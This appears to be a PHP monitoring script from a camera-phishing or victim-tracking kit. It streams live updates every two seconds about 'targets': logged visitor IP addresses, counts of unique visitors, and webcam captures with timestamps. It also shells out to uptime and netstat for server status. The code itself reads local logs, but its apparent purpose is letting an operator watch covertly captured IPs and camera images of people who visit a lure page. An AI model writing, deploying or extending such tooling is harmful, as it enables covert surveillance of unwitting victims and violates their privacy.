<?php
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');
header('Connection: keep-alive');
header('Access-Control-Allow-Origin: *');

// Function to send SSE data
function sendSSE($data) {
    echo "data: " . json_encode($data) . "\n\n";
    ob_flush();
    flush();
}

// Function to get latest data from all log files
function getLatestTargetData() {
    $data = [];
    
    // Get latest IP logs
    if (file_exists('ip.json')) {
        $ip_logs = json_decode(file_get_contents('ip.json'), true);
        if (!empty($ip_logs)) {
            $latest_ip = end($ip_logs);
            $data['latest_ip'] = $latest_ip;
            $data['total_visitors'] = count($ip_logs);
            
            // Get unique IPs
            $unique_ips = [];
            foreach ($ip_logs as $log) {
                $unique_ips[$log['ip']] = true;
            }
            $data['unique_visitors'] = count($unique_ips);
        }
    }
    
    // Get latest camera captures
    if (file_exists('captures.json')) {
        $captures = json_decode(file_get_contents('captures.json'), true);
        if (!empty($captures)) {
            $latest_capture = end($captures);
            $data['latest_capture'] = $latest_capture;
            $data['total_captures'] = count($captures);
            
            // Get captures from last hour
            $recent_captures = 0;
            $one_hour_ago = time() - 3600;
            foreach ($captures as $capture) {
                if ($capture['timestamp_unix'] > $one_hour_ago) {
                    $recent_captures++;
                }
            }
            $data['captures_last_hour'] = $recent_captures;
        }
    }
    
    // Get server status
    $data['server_time'] = date('Y-m-d H:i:s');
    $data['server_uptime'] = shell_exec('uptime 2>/dev/null || echo "N/A"');
    $data['memory_usage'] = memory_get_usage(true);
    $data['memory_peak'] = memory_get_peak_usage(true);
    
    // Get active connections (if possible)
    $data['active_connections'] = 'N/A';
    if (function_exists('shell_exec')) {
        $connections = shell_exec('netstat -an 2>/dev/null | grep :8080 | grep ESTABLISHED | wc -l');
        if ($connections !== null) {
            $data['active_connections'] = trim($connections);
        }
    }
    
    return $data;
}

// Main monitoring loop
$counter = 0;
while (true) {
    $data = getLatestTargetData();
    $data['counter'] = $counter++;
    sendSSE($data);
    
    // Check for client disconnect
    if (connection_aborted()) {
        break;
    }
    
    // Send update every 2 seconds
    sleep(2);
}
?>
